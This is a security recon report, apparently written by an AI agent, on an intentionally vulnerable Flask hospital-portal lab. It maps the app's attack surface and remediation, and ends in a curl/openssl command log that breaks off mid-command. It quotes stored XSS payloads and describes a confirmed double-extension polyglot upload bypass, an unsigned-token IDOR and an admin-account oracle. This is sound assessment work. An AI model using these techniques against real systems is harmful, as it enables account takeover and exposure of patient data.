# Recon Report — NileCare / "Egyptian Specialist Hospital"

- **Target (initial pass):** https://salvation-materials-wall-category.trycloudflare.com/
- **Target (2026-10-25 pass):** https://patricia-chapter-suites-patches.trycloudflare.com/
- **Target (current, 2026-10-26):** https://magnetic-paragraph-romance-hobbies.trycloudflare.com/ — the Quick Tunnel hostname rotates; the app, routes, and stored files are the same.
- **Date:** 2026-10-25 15:52 – 2026-10-26 22:10 UTC
- **Source IP / edge:** 156.198.255.29 → Cloudflare `MRS` (Marseille)
- **Method:** unauthenticated, non-destructive HTTP recon. No brute force, no writes (no bookings/messages/reviews), no exploitation of the leads below.
- **Verdict:** a Flask "hospital portal" demo/lab, published through an ephemeral Cloudflare Quick Tunnel. Several intentionally-flagged weak spots are visible in source.

---

## 1. Infrastructure

| Item | Result |
|---|---|
| Fronting | Cloudflare (`server: cloudflare`, `cf-ray`, `cf-cache-status: DYNAMIC`) |
| DNS | A 104.16.230.132 / 104.16.231.132; AAAA 2606:4700::6810:e684 / :e784 |
| Parent domain | `trycloudflare.com` (Cloudflare registrar, created 2018-07-07, NS kevin/marjory.ns.cloudflare.com) |
| Tunnel type | Cloudflare **Quick Tunnel** (random 4-word hostname under `*.trycloudflare.com`; origin IP is not exposed) |
| TLS cert | CN=`trycloudflare.com`, SAN `*.trycloudflare.com`, Google Trust Services WE1, valid 2026-10-05 → 2027-01-03 |
| TLS versions | 1.3 (X25519MLKEM768) preferred, 1.2 OK, **1.0 and 1.1 still accepted** (TLS1.0 `ECDHE-RSA-AES128-SHA`) |
| HTTP | HTTP/2; plain **HTTP returns 200 with no redirect to HTTPS**; no `alt-svc`/HTTP3 advertised |
| HSTS | absent |
| robots.txt | Cloudflare-managed block (`Allow: /`, `Content-Signal: search=yes, ai-train=no`, AI crawlers blocked) **plus** 100 app-specific `Disallow` entries (see §3) |
| Uptime note | Quick Tunnel hostnames are temporary; do not treat as a stable production origin |

`nilecare.com.eg` (used in all published e-mail addresses) has **no DNS records** — the brand/contact data is synthetic.

---

## 2. Technology fingerprint

- **Flask / Jinja2 / Werkzeug** — footer says "Built with Flask"; default Werkzeug 404/405 pages; `vary: Cookie`; Flask-signed `session=` cookie.
- Server version is hidden (no `Server` origin header, `/console` 404, debug off).
- Custom CSS (`/static/css/style.css`, 59 KB, Last-Modified 2026-07-23) and JS (`/static/js/main.js`, 10 KB).
- Front end: Font Awesome 6.4.0, Google Fonts (Inter/Outfit), Unsplash images.
- Cloudflare Email Obfuscation (`/cdn-cgi/l/email-protection`) is enabled.

---

## 3. Surface map

### Public pages (200)
| Path | Notes |
|---|---|
| `/` | Home, doctor search, contact form |
| `/services` | Department pages |
| `/doctors` | Full directory, 22 doctors, reviews UI |
| `/branches` | 3 branches + phones |
| `/lab-tests` | 8 tests + prices + booking form |
| `/book` | Appointment booking (guest allowed) |
| `/login` | Login form |
| `/register` | Open registration |
| `/forgot-password` | Reset request form |
| `/api/doctors` | JSON, **no auth**, 9.7 KB |
| `/api/v1/doctors/<id>/slots` | JSON slots, **no auth** |
| `/logout` | GET logout (no confirmation) |

### Auth-gated (302 → `/login`)
`/dashboard`, `/profile`, `/reset-password` (needs token), `POST /lab-tests/book`, `/api/v1/reports/view`

### Other statuses
- `405`: `GET /contact`, `GET /lab-tests/book` (POST-only)
- `404`: `/admin`, `/sitemap.xml`, `/api/*` (except above), `/static/` listing, `/api/v1/reports` (list), `.git/HEAD`, `.env`, `app.py`, `requirements.txt`, `console`, `server-status`, etc.
- Path traversal attempts under `/static/` are rejected (404/400).
- `TRACE` → 405. `OPTIONS` advertises normal methods.

### Hidden/JS-discovered endpoints
- `/api/v1/doctors/{docId}/slots` — used by `book.html` (date param is ignored; id 999 still returns slots).
- `/api/v1/reports/view?token=<base64>` — referenced inside a stored review payload in `doctors.html`; returns 302 to login without a session.
- `/reports/upload-attachment` — **medical-report attachment upload**, POST-only (GET → 405 `Allow: POST, OPTIONS`), referenced by the "Upload Medical Report / Attachment" form on the authenticated `/dashboard`. Anonymous POST → 302 `/login` with flash `Please login to upload attachments.` With a patient session it accepts a `multipart/form-data` field named `attachment`; see §D.4 for the confirmed success/rejection behavior.
- `/admin_portal_temp_secure_9203` — **hidden admin login**, discovered from the custom `robots.txt` section. Public GET → 200, title "System Administration", form `POST email + password` with no CSRF token. Anonymous POST with empty fields → 200 and the message `Administrative email account not found in system.` (account-existence oracle). `GET /admin_portal_temp_secure_9203/logout` exists (302 back to the login, flash `Logged out from admin session.`). Credentials not guessed.
- `robots.txt` also lists **100 pseudo-random "private" paths** (`/v2_dump_98196`, `/debug_hidden_14434`, `/db_test_67237`, …). An OPTIONS sweep of all 100 found only `/admin_portal_temp_secure_9203` live — the rest return 404 and appear to be decoys/noise.

---

## 4. Data exposed without authentication

- **22 doctors**: name, specialty, bio, years, rating, weekly schedule, and `@nilecare.com.eg` e-mail (e.g. `a.sherbiny@nilecare.com.eg`). Available as JSON via `/api/doctors`.
- **8 lab tests and prices** (CBC 350, ECG 400, HbA1c 450, Lipid 500, LFT 550, Thyroid 650, X-ray 800, Ultrasound 1200 EGP).
- **3 branches** with street addresses and phone numbers (Giza, New Cairo, Alexandria).
- Contact details: +20 2 3345-6789, `info@nilecare.com.eg`, `admin@nilecare.com.eg`; emergency 123 / 19789.
- Doctor reviews contain **pre-existing XSS test artifacts** (`<script>fetch('/api/v1/reports/view?token=...')</script>`, `<img src=x onerror=...>`, `XSREV <b>BOLDREV</b>`); they are HTML-escaped on render.

---

## 5. Session / auth behaviour

- Cookie: `session=<base64 JSON>.<timestamp>.<hmac>` → standard Flask signed session.
- Flags: **HttpOnly only** — no `Secure`, no `SameSite`, no `Max-Age`. Cookie is host-only.
- Session payload is readable/decodable (contains flash messages); signing key not tested.
- Access control is per-route redirect (`302 /login`) with flash text; no visible role separation, no 2FA.
- Login errors are generic (`Invalid email or password.`); forgot-password response is generic (`If an account associated with ...`), so no obvious enumeration via text.
- Server-side validation exists for booking/registration (`All marked fields are required.`, `Passwords do not match.`).
- Registration is open; password minimum appears to be 6 chars (client-side `minlength`). A proxied signup with password `123456` succeeded immediately (302 to `/login`, then login → `/dashboard`), no e-mail verification. New accounts receive numeric IDs well into the hundreds (an uploaded avatar was named `user_896_…`), so user IDs are sequential/enumerable.
- **No CSRF tokens on any form** (login, register, book, contact, lab booking, profile upload, admin login) → CSRF exposure. `GET /logout` and `GET /admin_portal_temp_secure_9203/logout` are also CSRF-able.
- **Two separate upload surfaces exist:**
  - **Profile photo** — `POST /profile`, `multipart/form-data` field `profile_image`, no CSRF token. Stored as `/static/uploads/user_<user_id>_<unix_ts>.jpeg` and served unauthenticated as `image/jpeg` (`Content-Disposition: inline`). A legitimate JPEG uploaded through the proxied browser was stored as `user_896_1792958928.jpeg` and returned 200 without any cookie.
  - **Medical-report attachment** — `POST /reports/upload-attachment`, `multipart/form-data` field `attachment`, login-gated. It keeps the **original client filename** and stores it under `/static/uploads/attachments/<original_name>`, so attachments are also public and predictable (e.g. `/static/uploads/attachments/king.jpeg` → 200 `image/jpeg` with no auth). Validation checks the declared `Content-Type`, the file's magic bytes, and that the filename *contains* an allowed extension; the last check is bypassable with a double extension, giving confirmed stored XSS (see §D.8).
- The **profile-photo** handler checks the **final** extension against `png/jpg/jpeg/gif`, not a substring: `poc.jpg.py` is rejected with `Invalid image format. Allowed formats: png, jpg, jpeg, gif.`. A JPEG polyglot named `poc.jpg` (JPEG magic + Python `print`) is accepted and stored as `user_896_<ts>.jpg`, served as `image/jpeg`; the Python bytes survive but are **not executed**. The handler does not re-encode, so trailing data remains in the file. Original avatar was restored after the test (see §D.9).
- The hidden admin login uses the same Flask session cookie for its flash messages and redirects; it is a separate credential check (not the patient `/login`).
- No rate limiting/lockout was observed during ~40 low-rate requests (not a definitive test); no lockout was seen after one empty admin login attempt.

---

## 6. HTTP security headers

Missing on HTML responses:

- `Strict-Transport-Security`
- `Content-Security-Policy` / `frame-ancestors`
- `X-Frame-Options`
- `X-Content-Type-Options`
- `Referrer-Policy`
- `Permissions-Policy`
- COOP/COEP/CORP

Present: `server: cloudflare`, `cf-ray`, `vary: Cookie`, duplicated `x-robots-tag: none`.

Other:
- No CORS headers on the API (not cross-origin readable).
- Static assets: `cache-control: no-cache`; `ETag` and `Last-Modified: 2026-07-23` disclose build/file metadata.
- No favicon, no `sitemap.xml`, no `security.txt`.

---

## 7. Leads worth verification (authorized testing only)

1. **Client-trusted discount (price tampering)** — `lab-tests.html` contains hidden `discount_pct`, set by JS and commented in source:
   `<!-- VULNERABILITY: discount_pct is set by JS and trusted by the server without re-validation -->`.
   Burp confirms the real POST body is `test_id=…&discount_pct=…&discount_code=…`; the server *does* reject an invalid code (`Invalid discount code. Please check and try again.`), so the comment may refer to the `discount_pct` field being trusted once a code is accepted. Requires an authenticated session; not submitted.
2. **Report token / IDOR** — `/api/v1/reports/view?token=eyJ1c2VyX2lkIjogNjksICJyZXBvcnRfaWQiOiA2OX0=` decodes to `{"user_id": 69, "report_id": 69}` in **plain, unsigned Base64** → predictable/forgeable object reference. Endpoint requires login; not accessed.
3. **Stored XSS in reviews** — review data already contains script payloads from earlier testers; current Jinja output escapes them, but the feature is the obvious injection sink (login required to post).
4. **Slots API** — `/api/v1/doctors/999/slots` returns a slot list (id/date not validated); low impact but indicates missing authorization/validation.
5. **Staff e-mail disclosure** — unauthenticated `/api/doctors` exposes 22 corporate addresses and schedules.
6. **Open guest booking + no CSRF** — appointments can be created unauthenticated by design; combined with missing CSRF tokens this is abusable for spam/state changes.
7. **Legacy TLS + HTTP** — TLS 1.0/1.1 accepted and plain HTTP serves content; session cookie lacks `Secure`.
8. **Framework hints in HTML** — source comments literally label a vulnerability, and prior exploit artifacts are stored, strongly suggesting an intentionally vulnerable training/lab deployment.
9. **Hidden admin portal** — `/admin_portal_temp_secure_9203` (+ `/logout`) is reachable anonymously and advertises itself in `robots.txt`. The login form has no CSRF token and returns a distinct `Administrative email account not found in system.` message, suggesting an account-enumeration oracle. Only one empty-credential POST was made; no guessing/brute force, and the publicly listed `admin@nilecare.com.eg` was not submitted.
10. **Two upload endpoints, both without CSRF** — profile photo (`POST /profile`, `profile_image`) and medical-report attachment (`POST /reports/upload-attachment`, `attachment`). The attachment handler stores the client-supplied filename under a public directory and validates `Content-Type`, magic bytes, and a *substring* extension check; a double-extension JPEG polyglot (`poc.jpg.html`) bypasses all three and is served as `text/html` → stored XSS (§D.8). The profile handler renames to `user_<id>_<ts>.jpeg`, which limits extension tricks but still exposes a public, predictable file. See §D.4 and §D.8.
11. **Public, enumerable uploads** — avatars are served unauthenticated from `/static/uploads/user_<id>_<timestamp>.jpeg` (sequential user ID in the name, observed `user_896_…`), and medical attachments are served unauthenticated from `/static/uploads/attachments/<original_filename>` (observed `king.jpeg`). Neither path requires a session and neither uses an unguessable name. Not enumerated across users.
12. **robots.txt information leak** — 100 custom `Disallow` entries disclose a naming scheme for "hidden" admin/db/debug/backup paths (only one is live). It also confirms the Cloudflare-managed crawler policy block is prepended to the app's own robots file.
13. **Stored XSS via medical-report upload (confirmed)** — the uploader checks `Content-Type`, magic bytes, and that the filename *contains* an allowed extension, but then serves by the **final** extension. A JPEG-polyglot body uploaded as `poc.jpg.html` passes all three checks, is stored at `/static/uploads/attachments/poc.jpg.html`, and is returned as `Content-Type: text/html; charset=utf-8` with `Content-Disposition: inline` and no `X-Content-Type-Options`. JavaScript executes on the target origin (verified in headless Chromium). Because the file is public and unauthenticated, any visitor can be attacked; because it is same-origin, it can act as the logged-in patient (the session cookie itself is HttpOnly). See §D.8.

---

## 8. Not performed

No credential brute force, no password reset abuse, no account creation by me, no bookings/contact/review submissions, no discount or token manipulation, no XSS execution against third parties, no port scanning, no WAF evasion. Findings above are from GET/HEAD/OPTIONS, one invalid login, one empty admin-login POST, one anonymous upload-endpoint POST (rejected before any file was processed), and validation-only POSTs that returned errors. The registered test account, the avatar, and the original `king.jpeg` / `shell.php` / `shell.php.jpg` upload attempts were performed interactively in the proxied browser (user-side), not by this recon.

On 2026-10-26, at the owner's explicit request, this recon performed **benign proof-of-concept uploads** to `/reports/upload-attachment` using the test account (`te@st`): an HTML-only file (rejected by magic bytes), a JPEG+HTML polyglot named `poc.jpg.html` (accepted; `alert(document.domain)`), a second polyglot named `poc2.jpg.html` (accepted; DOM marker for headless verification), and a traversal probe (`../poc-traversal.jpg.html`, sanitized to the attachments directory). No destructive payload, no data exfiltration, no persistence, and no access to another user's files.

**Cleanup:** the three accepted PoC files were overwritten in place with a clean 1×1 JPEG; they no longer contain HTML or JavaScript. The app exposes no delete route (`DELETE` → `405`), so the files themselves still exist under `static/uploads/attachments/` and must be removed server-side with `rm` (command in §D.8).

---

## 9. Prioritized remediation

1. Enforce HTTPS + HSTS, TLS ≥ 1.2, and set `Secure; HttpOnly; SameSite=Lax` on the session cookie.
2. Add CSRF tokens to all state-changing forms; make logout POST-only.
3. Recompute discounts server-side; never trust `discount_pct`.
4. Replace unsigned Base64 report tokens with signed, short-lived tokens and enforce object-level authorization.
5. Remove staff e-mails from public APIs; require auth + rate limits on JSON endpoints.
6. Add CSP, `X-Content-Type-Options`, `X-Frame-Options`/`frame-ancestors`, `Referrer-Policy`, `Permissions-Policy`.
7. Validate doctor id/date on the slots API; escape review fields contextually (already escaped in current views).
8. Do not expose a Flask app via a temporary Quick Tunnel; terminate TLS at a controlled origin and hide build metadata (`ETag`/`Last-Modified`).
9. Remove the admin portal from `robots.txt`, rate-limit and monitor `POST /admin_portal_temp_secure_9203`, make its error messages generic, add CSRF tokens, and make admin logout POST-only.
10. Validate uploads server-side using **file content/magic bytes**, not the client-supplied `Content-Type`; ignore the client filename and generate a random name; store outside the web root or block execution; enforce size limits; and require authorization to retrieve both avatars and medical attachments. Apply the same controls to `/profile` and `/reports/upload-attachment`.
11. **Fix the upload extension check**: evaluate only the final extension (`os.path.splitext(...)[1]`), not a substring, and do not let an allowed extension appear earlier in the name. Re-encode images server-side (strip trailing data/polyglots), serve uploads with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`, and never serve user uploads as `text/html` from the application origin. Consider a separate cookieless domain for user content.

> If this host is yours or an authorized lab, I can proceed to targeted verification of items 1–4. If not, treat the report as passive OSINT only.

---

## Appendix A — Doctor directory (from `/api/doctors`)

| ID | Name | Specialty | Experience | E-mail | Schedule |
|---|---|---|---|---|---|
| 1 | Dr. Ahmed El-Sherbiny | Cardiology | 15 Years | a.sherbiny@nilecare.com.eg | Mon, Wed, Fri (9 AM - 2 PM) |
| 2 | Dr. Hossam Farouk | Cardiology | 20 Years | h.farouk@nilecare.com.eg | Tue, Thu (10 AM - 3 PM) |
| 3 | Dr. Nadia Helmy | Cardiology | 9 Years | n.helmy@nilecare.com.eg | Sat, Mon (1 PM - 6 PM) |
| 4 | Dr. Mona El-Shazly | Pediatrics | — | m.shazly@nilecare.com.eg | Tue, Thu, Sat (10 AM - 4 PM) |
| 5 | Dr. Amira Nabil | Pediatrics | — | a.nabil@nilecare.com.eg | Mon, Wed (9 AM - 1 PM) |
| 6 | Dr. Khaled Mansour | Pediatrics | — | k.mansour@nilecare.com.eg | Sun, Tue, Thu (2 PM - 7 PM) |
| 7 | Dr. Sherif Selim | Neurology | — | s.selim@nilecare.com.eg | Mon, Tue, Thu (1 PM - 6 PM) |
| 8 | Dr. Laila Abdel-Rahman | Neurology | — | l.abdelrahman@nilecare.com.eg | Wed, Fri (10 AM - 4 PM) |
| 9 | Dr. Youssef Kamel | Neurology | — | y.kamel@nilecare.com.eg | Sat, Mon, Wed (8 AM - 12 PM) |
| 10 | Dr. Mahmoud Abdel-Aziz | Orthopedics | — | m.abdelaziz@nilecare.com.eg | Wed, Fri (11 AM - 5 PM) |
| 11 | Dr. Hassan Gamal | Orthopedics | — | h.gamal@nilecare.com.eg | Mon, Tue (9 AM - 3 PM) |
| 12 | Dr. Sara El-Masry | Orthopedics | — | s.elmasry@nilecare.com.eg | Thu, Sat (12 PM - 5 PM) |
| 13 | Dr. Rania Youssef | General Medicine | — | r.youssef@nilecare.com.eg | Daily (8 AM - 1 PM) |
| 14 | Dr. Mohamed Rizk | General Medicine | — | m.rizk@nilecare.com.eg | Sun, Tue, Thu (3 PM - 8 PM) |
| 15 | Dr. Fatma El-Sayed | General Medicine | — | f.elsayed@nilecare.com.eg | Mon, Wed, Sat (9 AM - 2 PM) |
| 16 | Dr. Tarek El-Kady | Dermatology | — | t.elkady@nilecare.com.eg | Tue, Thu (2 PM - 7 PM) |
| 17 | Dr. Dina Samir | Dermatology | — | d.samir@nilecare.com.eg | Mon, Wed, Fri (10 AM - 3 PM) |
| 18 | Dr. Omar Rashad | Dermatology | — | o.rashad@nilecare.com.eg | Sat, Tue (1 PM - 6 PM) |
| 19 | Dr. Waleed Mostafa | ENT | — | w.mostafa@nilecare.com.eg | Mon, Wed (11 AM - 5 PM) |
| 20 | Dr. Heba Fouad | ENT | — | h.fouad@nilecare.com.eg | Thu, Sat (9 AM - 2 PM) |
| 21 | Dr. Ayman Sabry | Ophthalmology | — | a.sabry@nilecare.com.eg | Tue, Thu, Sat (10 AM - 4 PM) |
| 22 | Dr. Noha Ibrahim | Ophthalmology | — | n.ibrahim@nilecare.com.eg | Sun, Mon, Wed (1 PM - 6 PM) |

## Appendix B — Lab catalogue

| ID | Test | Price | Turnaround |
|---|---|---|---|
| 1 | Complete Blood Count (CBC) | 350 EGP | 2–4 h |
| 2 | Lipid Profile Panel | 500 EGP | 4–6 h |
| 3 | Thyroid Function Panel (TSH/T3/T4) | 650 EGP | 6–8 h |
| 4 | HbA1c — Glycated Hemoglobin | 450 EGP | 4–6 h |
| 5 | Chest X-Ray (Digital) | 800 EGP | 30 min |
| 6 | Abdominal Ultrasound | 1200 EGP | 30 min |
| 7 | Electrocardiogram (ECG) | 400 EGP | 15 min |
| 8 | Liver Function Tests (LFTs) | 550 EGP | 4–6 h |

---

## Appendix C — Methodology, tools, and command log

### C.1 Tools used

| Tool | Version / role |
|---|---|
| `curl` | 8.15.0 — every HTTP/HTTPS request, headers, cookies, methods, POST validation probes |
| `openssl s_client` / `openssl x509` | TLS handshake, certificate parsing, per-version TLS probes |
| `dig` | A/AAAA/NS/MX/TXT lookups |
| `whois` | parent-domain registration data |
| `python3` | Base64/JSON parsing, Cloudflare e-mail decoding, HTML text extraction |
| `grep`, `sed`, `awk`, `wc`, `sort`, `diff` | parsing saved responses and extracting routes/forms/headers |
| `zsh` loops | low-rate endpoint enumeration against a custom 46-path list |

**Not used:** nmap, masscan, nuclei, ffuf, gobuster, feroxbuster, sqlmap, nikto, subfinder, amass, Burp/ZAP active scanning, or any exploit framework. The only authenticated traffic was the interactive browser session whose requests appear in Burp history; this recon added no authenticated writes of its own.

### C.2 Environment and scope

- Host substitution used below:
  ```bash
  TARGET=salvation-materials-wall-category.trycloudflare.com   # initial pass
  # rotated for the 20:00–21:50 UTC pass:
  # TARGET=patricia-chapter-suites-patches.trycloudflare.com
  ```
- Linux/zsh, source IP `156.198.255.29`, Cloudflare edge `MRS`.
- Window: 2026-10-25 15:52–16:09 UTC.
- Request rate kept low (single requests / short loops, roughly ≤ 2 req/s).
- Raw evidence saved in `/tmp/opencode/recon/` (`root.html`, `pages/`, `api_doctors.json`, `main.js`, `style.css`, response headers, cookie jars).

### C.3 Command log (chronological)

**1. Baseline response + certificate**

```bash
curl -sS -I -L --max-time 20 "https://$TARGET/"
```
Result:
```
HTTP/2 200
date: Sun, 25 Oct 2026 15:52:22 GMT
content-type: text/html; charset=utf-8
cf-ray: a5026356aca65ee7-MRS
cf-cache-status: DYNAMIC
server: cloudflare
vary: Cookie
x-robots-tag: none
x-robots-tag: none
```

```bash
echo | openssl s_client -connect $TARGET:443 -servername $TARGET 2>/dev/null \
  | openssl x509 -noout -subject -issuer -dates -ext subjectAltName
```
Result: `CN=trycloudflare.com`, issuer `Google Trust Services WE1`, valid `2026-10-05 → 2027-01-03`, SAN `DNS:trycloudflare.com, DNS:*.trycloudflare.com`.

**2. DNS / WHOIS**

```bash
for h in $TARGET trycloudflare.com cloudflare.com; do
  dig +short A $h; dig +short AAAA $h; dig +short NS $h
done
whois trycloudflare.com | head -40
```
Result:
```
$TARGET   A 104.16.230.132, 104.16.231.132
          AAAA 2606:4700::6810:e684, 2606:4700::6810:e784
trycloudflare.com NS kevin.ns.cloudflare.com, marjory.ns.cloudflare.com
whois: registrar Cloudflare, created 2018-07-07, expiry 2032-07-07, DNSSEC unsigned
```

**3. Root page + headers**

```bash
curl -sS -D headers.txt -o root.html "https://$TARGET/"
wc -c root.html
```
Result: `20182 root.html`. Title `Home - Egyptian Specialist Hospital`; footer "Built with Flask".

**4. Common-file probe**

```bash
for p in robots.txt sitemap.xml sitemap_index.xml manifest.json \
         .well-known/security.txt favicon.ico ads.txt humans.txt; do
  curl -sS -o /dev/null --max-time 15 \
    -w "$p -> %{http_code} %{size_download} %{content_type}\n" "https://$TARGET/$p"
done
```
Result:
```
robots.txt -> 200 6614 text/plain; charset=utf-8
sitemap.xml, sitemap_index.xml, manifest.json,
.well-known/security.txt, favicon.ico, ads.txt, humans.txt -> 404 207 text/html
```

**5. Route enumeration**

```bash
for p in "" services doctors branches lab-tests book login register dashboard \
         contact logout admin api api/doctors api/lab-tests; do
  curl -sS -L --max-time 20 -o "pages/${p:-root}.html" \
    -w "/$p -> %{http_code}|%{size_download}|%{url_effective}\n" "https://$TARGET/$p"
done
```
Result (key rows):
```
/                 -> 200 20182
/services         -> 200 17461
/doctors          -> 200 88638
/branches         -> 200 16937
/lab-tests        -> 200 36629
/book             -> 200 20380
/login            -> 200 10395
/register         -> 200 12077
/dashboard        -> 302 -> /login (200)
/contact          -> 405 153
/logout           -> 200 20182 (root)
/admin            -> 404 207
/api              -> 404 207
/api/doctors      -> 200 9685 (JSON)
/api/lab-tests    -> 404 207
```

**6. Sensitive-file / backup probe**

```bash
for p in .git/HEAD .git/config .env .env.bak config.py app.py requirements.txt \
         Dockerfile docker-compose.yml backup.zip app.db database.db instance/app.db \
         static/ static/js/ static/css/ console debug phpinfo.php server-status .DS_Store; do
  curl -sS -o /dev/null --max-time 12 -w "$p -> %{http_code} %{size_download} %{content_type}\n" "https://$TARGET/$p"
done
```
Result: **all 404** (`207` bytes, default Werkzeug page). No source/database/backup exposure.

**7. Link/form extraction**

```bash
grep -ohE '(href|action|src)="[^"]+"' pages/*.html | sed 's/.*="//;s/"$//' | sort -u
grep -nE '<form|name="|method="' pages/book.html pages/login.html pages/register.html pages/lab-tests.html
grep -rliE 'csrf' pages/*.html
```
Result: route list including `/forgot-password`, `/lab-tests/book`, `/book?doc_id=1..22`, `/doctors?specialty=...`; form fields recorded (login `email/password`, register `full_name/email/phone/password/confirm_password`, booking `name/email/phone/doctor_id/date/time/notes`, lab `test_id/discount_pct/discount_code`). **No `csrf` token found in any page.**

**8. Static assets + API**

```bash
curl -sS "https://$TARGET/api/doctors" -o api_doctors.json
curl -sS "https://$TARGET/static/js/main.js" -o main.js   # 200 10042
curl -sS "https://$TARGET/static/css/style.css" -o style.css # 200 59421
python3 - <<'PY'
import json
d=json.load(open('api_doctors.json'))
print(len(d),'doctors')
for x in d: print(x['id'],x['name'],x['specialty'],x['email'],x['schedule'])
PY
```
Result: **22 doctors** with name/specialty/experience/bio/rating/schedule/e-mail; JS referenced `fetch('/api/v1/doctors/${docId}/slots')`.

**9. Cloudflare e-mail decode**

```bash
python3 - <<'PY'
import re
h=open('root.html',encoding='utf-8').read()
for m in re.findall(r'data-cfemail="([0-9a-f]+)"',h):
    k=int(m[:2],16)
    print(''.join(chr(int(m[i:i+2],16)^k) for i in range(2,len(m),2)))
PY
```
Result: `info@nilecare.com.eg`, `admin@nilecare.com.eg`.

**10. Access-control redirects**

```bash
curl -sS -i "https://$TARGET/login"
curl -sS -i "https://$TARGET/dashboard"
curl -sS -i "https://$TARGET/profile"
curl -sS -i "https://$TARGET/reset-password"
```
Result: `/login` 200; `/dashboard` 302 `location: /login`; `/profile` 302 `location: /login`; `/reset-password` 302 `location: /login`. Each 302 set `session=...; HttpOnly; Path=/` with a flash message (e.g. "Please login to access your patient portal.").

**11. Methods**

```bash
curl -sS -i -X OPTIONS "https://$TARGET/"
curl -sS -o /dev/null -w '%{http_code}\n' -X TRACE "https://$TARGET/"
curl -sS -i -X OPTIONS "https://$TARGET/api/doctors"
```
Result: `allow: GET, OPTIONS, HEAD`; `TRACE -> 405`; API `allow: GET, OPTIONS, HEAD`.

**12. Error / parameter probes**

```bash
for u in "/book?doc_id=abc" "/doctors?specialty=%27" \
         "/api/doctors?specialty=%27" "/lab-tests?test_id=abc"; do
  curl -sS -o /dev/null -w "$u -> %{http_code} %{size_download}\n" "https://$TARGET$u"
done
```
Result:
```
/book?doc_id=abc          -> 200 20380
/doctors?specialty='      -> 200 88638  (no error)
/api/doctors?specialty='  -> 200 3      (body "[]")
/lab-tests?test_id=abc    -> 200 36629
```
No SQL error/traceback observed; quote payload returns an empty JSON array.

**13. API filter behaviour**

```bash
for q in "" "?specialty=Cardiology" "?specialty=cardiology" "?search=Ahmed" \
         "?id=1" "?specialty=Cardiology%27" "?specialty=Cardiology%22" \
         "?specialty=Cardiology%20OR%201=1"; do
  printf '%-40s' "$q"
  curl -sS "https://$TARGET/api/doctors$q" | head -c 120; echo
done
```
Result: unfiltered / `Cardiology` / `search=Ahmed` / `id=1` return records; `cardiology` (lowercase) returns `[]`; `'`, `"`, `OR 1=1` return `[]` — consistent with exact-match, parameterized filtering.

**14. Reflection / output encoding**

```bash
curl -sS "https://$TARGET/doctors?search=reconxqz%3Cb%3Etest%3C%2Fb%3E" -o xss.html
grep -o 'reconxqz.\{0,40\}' xss.html
```
Result: `reconxqz&lt;b&gt;test&lt;/b&gt;` — reflected but **HTML-escaped**.

**15. Slots API**

```bash
for u in "/api/v1/doctors/1/slots" "/api/v1/doctors/1/slots?date=2026-10-27" \
         "/api/v1/doctors/999/slots?date=2026-11-02" "/api/v1/doctors/abc/slots?date=2026-11-02"; do
  echo "--- $u"; curl -sS -i "https://$TARGET$u" | sed -n '1,14p'
done
```
Result: `1/slots` and `?date=` return the same JSON (`09:00 AM`, `10:30 AM`, …); `999/slots` still returns slots; `abc/slots` → 404 (route requires `<int:doctor_id>`). Date is ignored and id 999 is not validated.

**16. Reports endpoint**

```bash
curl -sS -i "https://$TARGET/api/v1/reports/view?token=bad"
curl -sS -i "https://$TARGET/api/v1/reports/view"
```
Result: both **302 `location: /login`** with flash "Please login to view medical reports." No data returned unauthenticated.

**17. API v1 enumeration**

```bash
for p in api/v1/reports api/v1/reports/view api/v1/users api/v1/user api/v1/doctors \
         api/v1/appointments api/v1/lab-tests api/v1/branches api/v1/services api/v1/login api/v1/health; do
  curl -sS -o /dev/null -w "/$p -> %{http_code} %{size_download}\n" "https://$TARGET/$p"
done
```
Result: all **404** except `/api/v1/reports/view` → **302**.

**18. Validation-only POST probes (no records created)**

```bash
# one invalid login, non-existent account
curl -sS -i --max-time 20 -c cj.txt -b cj.txt -X POST \
  "https://$TARGET/login" \
  -d 'email=probe.recon@example.com&password=WrongPass123'

# empty booking
curl -sS -i --max-time 20 -c jb.txt -b jb.txt -d 'name=&email=&phone=&doctor_id=&date=&time=&notes=' \
  "https://$TARGET/book"

# password mismatch
curl -sS -i --max-time 45 -c jr.txt -b jr.txt \
  --data-urlencode 'full_name=Recon Probe' --data-urlencode 'email=probe.recon@example.com' \
  --data-urlencode 'phone=01000000000' --data-urlencode 'password=abcdef' \
  --data-urlencode 'confirm_password=abcdeg' "https://$TARGET/register"

# unknown account on reset
curl -sS -c j2.txt -b j2.txt -X POST "https://$TARGET/forgot-password" \
  -d 'email=probe.recon%40example.com'

# empty lab booking
curl -sS -i -c jl.txt -b jl.txt -X POST "https://$TARGET/lab-tests/book" -d ''

# empty contact
curl -sS -i -c jc2.txt -b jc2.txt \
  --data-urlencode 'name=' --data-urlencode 'email=' \
  --data-urlencode 'subject=' --data-urlencode 'message=' "https://$TARGET/contact"
```
Result (redirect + flash, read from the Set-Cookie session):
```
/login            -> 302 /login      "Invalid email or password. Please try again."
/book             -> 302 /book       "All marked fields are required."
/register         -> 302 /register   "Passwords do not match."
/forgot-password  -> 200             "If an account associated with ..." (generic)
/lab-tests/book   -> 302 /login      (authentication required)
/contact          -> 302 /#contact   "Please fill in all contact fields."
```
No account, booking, lab booking, contact message, or review was created.

**19. Header / transport checks**

```bash
curl -sS -I "https://$TARGET/static/css/style.css"
curl -sS -I "https://$TARGET/robots.txt"
curl -sS -I "https://$TARGET/" | grep -iE 'strict|content-security|x-frame|x-content|referrer|permissions|alt-svc|cache|etag|last-modified'
curl -sS -i "http://$TARGET/"
```
Result: static 200 with `cache-control: no-cache`, `etag: "1784815792.2661788-59421-2708280991"`, `last-modified: Thu, 23 Jul 2026 14:09:52 GMT`; **no** HSTS/CSP/XFO/XCTO/Referrer/Permissions/alt-svc headers; **plain HTTP returns 200** with the same HTML (no redirect).

**20. TLS version matrix**

```bash
for v in tls1 tls1_1 tls1_2 tls1_3; do
  echo | timeout 12 openssl s_client -connect $TARGET:443 -servername $TARGET -$v 2>/dev/null \
    | grep -E 'Protocol|Cipher is|New,' | head -3
done
```
Result:
```
tls1    -> TLSv1.0, ECDHE-RSA-AES128-SHA
tls1_1  -> TLSv1.1, ECDHE-RSA-AES128-SHA
tls1_2  -> TLSv1.2, ECDHE-ECDSA-CHACHA20-POLY1305
tls1_3  -> TLSv1.3, TLS_AES_256_GCM_SHA384
```
TLS 1.0 and 1.1 are still accepted.

**21. Path traversal**

```bash
for u in "/static/../app.py" "/static/%2e%2e/app.py" "/static/..%2fapp.py" \
